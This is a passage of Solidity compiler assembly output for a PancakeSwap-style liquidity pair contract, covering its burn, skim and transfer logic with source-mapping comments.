   extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_228\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_228:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_229\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_229:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_230\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_230:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8185:8189  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8135:8148  uint balance1 */\n      0x00\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8176  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8176  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_231\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_231:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_232\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_232:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_233\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_233:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8236:8240  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8201:8215  uint liquidity */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8218:8242  balanceOf[address(this)] */\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8218:8227  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      0x20\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8218:8242  balanceOf[address(this)] */\n      mstore\n      0x40\n      dup2\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8266:8296  _mintFee(_reserve0, _reserve1) */\n      tag_234\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8275:8284  _reserve0 */\n      dup9\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8286:8295  _reserve1 */\n      dup9\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8266:8274  _mintFee */\n      tag_204\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8266:8296  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_234:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8306:8323  uint _totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8326:8337  totalSupply */\n      sload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8253:8296  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8326:8337  totalSupply */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8458  liquidity.mul(balance0) */\n      tag_235\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8444  liquidity */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8449:8457  balance0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8458  liquidity.mul(balance0) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8448  liquidity.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8458  liquidity.mul(balance0) */\n      and\n      jump\t// in\n    tag_235:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8473  liquidity.mul(balance0) / _totalSupply */\n      dup2\n      tag_236\n      jumpi\n      invalid\n    tag_236:\n      div\n      swap11\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8567:8579  _totalSupply */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8564  liquidity.mul(balance1) */\n      tag_237\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8550  liquidity */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8555:8563  balance1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8564  liquidity.mul(balance1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8554  liquidity.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8564  liquidity.mul(balance1) */\n      and\n      jump\t// in\n    tag_237:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8579  liquidity.mul(balance1) / _totalSupply */\n      dup2\n      tag_238\n      jumpi\n      invalid\n    tag_238:\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8531:8579  amount1 = liquidity.mul(balance1) / _totalSupply */\n      swap10\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8668:8669  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8658:8665  amount0 */\n      dup12\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8658:8669  amount0 > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8658:8684  amount0 > 0 && amount1 > 0 */\n      dup1\n      iszero\n      tag_239\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8683:8684  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8673:8680  amount1 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8673:8684  amount1 > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8658:8684  amount0 > 0 && amount1 > 0 */\n    tag_239:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8637:8748  require(... */\n      tag_240\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_240:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8758:8789  _burn(address(this), liquidity) */\n      tag_241\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8772:8776  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8779:8788  liquidity */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8758:8763  _burn */\n      tag_242\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8758:8789  _burn(address(this), liquidity) */\n      jump\t// in\n    tag_241:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8799:8834  _safeTransfer(_token0, to, amount0) */\n      tag_243\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8813:8820  _token0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8822:8824  to */\n      dup14\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8826:8833  amount0 */\n      dup14\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8799:8812  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8799:8834  _safeTransfer(_token0, to, amount0) */\n      jump\t// in\n    tag_243:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8844:8879  _safeTransfer(_token1, to, amount1) */\n      tag_244\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8858:8865  _token1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8867:8869  to */\n      dup14\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8871:8878  amount1 */\n      dup13\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8844:8857  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8844:8879  _safeTransfer(_token1, to, amount1) */\n      jump\t// in\n    tag_244:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8934:8938  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8925  IERC20(_token0).balanceOf */\n      dup10\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8925  IERC20(_token0).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_245\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_245:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_246\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_246:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_247\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_247:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8995:8999  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap7\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:8986  IERC20(_token1).balanceOf */\n      dup9\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:8986  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_248\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_248:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_249\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_249:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_250\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_250:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9012:9061  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_251\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9020:9028  balance0 */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9040:9049  _reserve0 */\n      dup12\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9051:9060  _reserve1 */\n      dup12\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9012:9019  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9012:9061  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_251:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9075:9080  feeOn */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9071:9118  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_252\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9109:9117  reserve1 */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9090:9118  uint(reserve0).mul(reserve1) */\n      tag_253\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9095:9103  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9109:9117  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9090:9118  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9090:9108  uint(reserve0).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9090:9118  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_253:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9082:9087  kLast */\n      0x0e\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9082:9118  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9071:9118  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_252:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9173:9211  Burn(msg.sender, amount0, amount1, to) */\n      0x40\n      dup1\n      mload\n      dup13\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup16\n      and\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9178:9188  msg.sender */\n      caller\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9173:9211  Burn(msg.sender, amount0, amount1, to) */\n      0xdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496\n      swap3\n      swap1\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1357:1358  _ */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7789:9218  function burn(... */\n      swap2\n      pop\n      swap2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":438:508  address public FeeResiver = 0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n    tag_96:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x06))\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":262:302  string public constant symbol = \"KBC-LP\" */\n    tag_98:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_105:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3068:3072  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3116  _transfer(msg.sender, to, value) */\n      tag_182\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3094:3104  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3106:3108  to */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3110:3115  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3093  _transfer */\n      tag_190\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3116  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":515:563  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_107:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":515:563  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17828:18249  function skim(address to) external lock {... */\n    tag_110:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_257\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_257:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17945:17951  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18085:18093  reserve0 */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18074:18078  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      swap5\n      dup6\n      and\n      swap5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17945:17951  token1 */\n      swap1\n      swap4\n      and\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17976:18104  _safeTransfer(... */\n      tag_259\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      dup6\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18024:18026  to */\n      dup8\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18094  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      tag_260\n      swap3\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18085:18093  reserve0 */\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      dup6\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18065  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_261\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_261:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_262\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      